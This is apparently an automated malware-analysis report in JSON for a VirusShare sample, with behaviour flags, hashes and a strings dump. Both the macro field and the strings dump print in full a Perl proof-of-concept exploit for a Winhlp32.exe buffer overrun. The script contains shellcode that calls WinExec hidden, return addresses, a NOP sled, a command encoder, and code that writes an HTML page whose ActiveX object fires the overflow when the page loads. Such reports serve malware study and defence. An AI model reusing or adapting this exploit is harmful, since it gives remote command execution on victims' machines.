{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Output": "May write to a file",
            "SW_HIDE": "May hide the application",
            "call": "May call a DLL using Excel 4 Macros",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "open": "May open a file",
            "windows": "May enumerate application windows"
        },
        "macro": "# Winhlp32.exe Remote BufferOverrun exploit code. written by Gary O'leary-Steele Sec-1 Ltd. Garyo@sec-1.com\n# For use as proof of concept\n# Kernel32.dll version 5.0.2195.4272\n####### Kernell32 jmp ebx 77E87793\n\n\n$sploit =\n\"\\x55\\x8b\\xec\\x8b\\xc3\". \t\t#xc5 is ebp change if error\n\"\\xbe\\xff\\xff\\xff\\xff\".\n\"\\x81\\xEE\\x85\\x85\\x85\\x85\".\n\"\\x83\\xc0\\x01\".\n\"\\x8b\\x10\".\n\"\\x3b\\xd6\".\n\"\\x75\\xf7\".\t\t\n\"\\x8b\\xd8\".\n\"\\x83\\xc3\\x01\".\n\"\\x80\\x6b\\x03\\x41\".\n\"\\x8b\\x7b\\x04\".\n\"\\x81\\xff\\x58\\x58\\x58\\x58\".\n\"\\x75\\xEE\".\n\"\\x81\\x6b\\x04\\x58\\x58\\x58\\x58\".\n\"\\x33\\xf6\".\n\"\\x56\".\n\"\\x83\\xc0\\x04\".\n\"\\x50\".\n\"\\xbb\\x94\\xee\\xe8\\x77\".\t\t# mov ebx, 0x77e8ee94 winexec() address\n\"\\xff\\xd3\";\t\t\t#call ebx\n\n\n$exitproc = \n\"\\xBB\\x5d\\xa9\\xe8\\x77\".\n\"\\x83\\xeb\\x01\".\n\"\\xff\\xd3\";\n\n\n$RET = \"\\x24\\xF1\\x5d\\x01\";\n$EIP2 = \"\\x93\\x77\\xe8\\x77\";  # This works\n#$EIP2 = \"\\xf6\\xbf\\x30\\x78\";\n\n# direct jump = 0006FBD4 ##$EIP2 = \"\\xd4\\xfb\\x06\\x00\";\n\nprint \"Exploit code for Winhlp32.exe Remote BufferOverrun.\\nBy Gary Oleary-Steele Sec-1 Ltd\\nCalls WinExec SW_HIDE and executes supplied command\\nTested on windows 2000 professional SP2\\n\\n\";\nprint \"Enter Command to execute: \";\n$command =<STDIN>;\nprint \"Enter Output File: \";\n$outputfile =<STDIN>;\nchomp $command;\nchomp $outputfile;\nopen(INFILE,\">$outputfile\");\n$command = encode($command);\n$nn = 123 - length($command);\n$nops = \"\\x90\" x $nn;\n\n\n\n$exploit = $sploit . \"zzzz\". $command .'XXXX'. $nops .$exitproc. $RET .$EIP2;\n\n\n\n\n$f1= <<\"file1\"; \n<OBJECT classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\ncodeBase=hhctrl.ocx#Version=4,72,8252,0 height=0 id=winhelp\ntype=application/x-oleobject width=0><PARAM NAME=\"Width\"\nVALUE=\"26\"><PARAM NAME=\"Height\" VALUE=\"26\"><PARAM NAME=\"Command\"\nVALUE=\"WinHelp\"><PARAM NAME=\"Item1\"\nVALUE='\nfile1\nchomp $f1;\n\n$f2= <<\"file2\";\n'><PARAM\nNAME=\"Item2\" VALUE=\"Sec-1 LTD\"></OBJECT>\n<SCRIPT>winhelp.HHClick()</SCRIPT>\nfile2\n\nprint INFILE $f1.$exploit.$f2;\n\n\n\nsub encode($command){\n$lofcmd =length($command); \n$i = 0;\n\nfor ($i ;$i < $lofcmd; $i++){\n\n\n$chartoconvert = substr($command,$i,1); # pull out each character\n\n$chartoconvert = ord($chartoconvert); # convert to a dec \n\nfor ($b=0; $b < 65; $b++){\n$chartoconvert++ ;\n}\n\n$tmpchr = chr($chartoconvert); #convert back to chr\n$newchar = $newchar . $tmpchr;\n\n\n\n}\n\nprint $newchar;\nreturn $newchar;\n\n}\n\n\n\n"
    },
    "filename": "VirusShare_1a8e8b5b527b3d3bf230966975a8248c",
    "filesize": 2260,
    "filetype": "HTML document, ASCII text",
    "hashes": {
        "md5": "1a8e8b5b527b3d3bf230966975a8248c",
        "sha1": "6aadcc5105c3c1600cd9f6e0149ba883370348dd",
        "sha256": "d51b5844b984733f335e621404e81da9ba3972f55afab24141b4eeba7aef7f17"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "# Winhlp32.exe Remote BufferOverrun exploit code. written by Gary O'leary-Steele Sec-1 Ltd. Garyo@sec-1.com",
            "# For use as proof of concept",
            "# Kernel32.dll version 5.0.2195.4272",
            "####### Kernell32 jmp ebx 77E87793",
            "$sploit =",
            "\"\\x55\\x8b\\xec\\x8b\\xc3\". \t\t#xc5 is ebp change if error",
            "\"\\xbe\\xff\\xff\\xff\\xff\".",
            "\"\\x81\\xEE\\x85\\x85\\x85\\x85\".",
            "\"\\x83\\xc0\\x01\".",
            "\"\\x8b\\x10\".",
            "\"\\x3b\\xd6\".",
            "\"\\x75\\xf7\".\t\t",
            "\"\\x8b\\xd8\".",
            "\"\\x83\\xc3\\x01\".",
            "\"\\x80\\x6b\\x03\\x41\".",
            "\"\\x8b\\x7b\\x04\".",
            "\"\\x81\\xff\\x58\\x58\\x58\\x58\".",
            "\"\\x75\\xEE\".",
            "\"\\x81\\x6b\\x04\\x58\\x58\\x58\\x58\".",
            "\"\\x33\\xf6\".",
            "\"\\x56\".",
            "\"\\x83\\xc0\\x04\".",
            "\"\\x50\".",
            "\"\\xbb\\x94\\xee\\xe8\\x77\".\t\t# mov ebx, 0x77e8ee94 winexec() address",
            "\"\\xff\\xd3\";\t\t\t#call ebx",
            "$exitproc = ",
            "\"\\xBB\\x5d\\xa9\\xe8\\x77\".",
            "\"\\x83\\xeb\\x01\".",
            "\"\\xff\\xd3\";",
            "$RET = \"\\x24\\xF1\\x5d\\x01\";",
            "$EIP2 = \"\\x93\\x77\\xe8\\x77\";  # This works",
            "#$EIP2 = \"\\xf6\\xbf\\x30\\x78\";",
            "# direct jump = 0006FBD4 ##$EIP2 = \"\\xd4\\xfb\\x06\\x00\";",
            "print \"Exploit code for Winhlp32.exe Remote BufferOverrun.\\nBy Gary Oleary-Steele Sec-1 Ltd\\nCalls WinExec SW_HIDE and executes supplied command\\nTested on windows 2000 professional SP2\\n\\n\";",
            "print \"Enter Command to execute: \";",
            "$command =<STDIN>;",
            "print \"Enter Output File: \";",
            "$outputfile =<STDIN>;",
            "chomp $command;",
            "chomp $outputfile;",
            "open(INFILE,\">$outputfile\");",
            "$command = encode($command);",
            "$nn = 123 - length($command);",
            "$nops = \"\\x90\" x $nn;",
            "$exploit = $sploit . \"zzzz\". $command .'XXXX'. $nops .$exitproc. $RET .$EIP2;",
            "$f1= <<\"file1\"; ",
            "<OBJECT classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11",
            "codeBase=hhctrl.ocx#Version=4,72,8252,0 height=0 id=winhelp",
            "type=application/x-oleobject width=0><PARAM NAME=\"Width\"",
            "VALUE=\"26\"><PARAM NAME=\"Height\" VALUE=\"26\"><PARAM NAME=\"Command\"",
            "VALUE=\"WinHelp\"><PARAM NAME=\"Item1\"",
            "VALUE='",
            "file1",
            "chomp $f1;",
            "$f2= <<\"file2\";",
            "'><PARAM",
            "NAME=\"Item2\" VALUE=\"Sec-1 LTD\"></OBJECT>",
            "<SCRIPT>winhelp.HHClick()</SCRIPT>",
            "file2",
            "print INFILE $f1.$exploit.$f2;",
            "sub encode($command){",
            "$lofcmd =length($command); ",
            "$i = 0;",
            "for ($i ;$i < $lofcmd; $i++){",
            "$chartoconvert = substr($command,$i,1); # pull out each character",
            "$chartoconvert = ord($chartoconvert); # convert to a dec ",
            "for ($b=0; $b < 65; $b++){",
            "$chartoconvert++ ;",
            "$tmpchr = chr($chartoconvert); #convert back to chr",
            "$newchar = $newchar . $tmpchr;",
            "print $newchar;",
            "return $newchar;"
        ],
        "file": {},
        "fuzzing": {
            "Possible encoded string": [
                "\"\\xbe\\xff\\xff\\xff\\xff\"."
            ]
        },
        "ip": [],
        "url": []
    },
    "time": "0:00:00.277117",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
